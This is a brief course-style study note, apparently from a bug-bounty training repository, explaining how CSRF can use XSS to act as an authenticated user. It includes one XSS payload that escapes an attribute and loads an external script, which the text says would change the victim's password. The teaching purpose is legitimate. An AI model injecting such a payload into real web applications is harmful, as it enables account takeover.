# CSRF

`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

```html
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e., `JavaScript` code that changes our password for this specific web application).

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 2- Introduction to Web Applications/3 - Front End Vulnerabilities/4 - CSRF.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
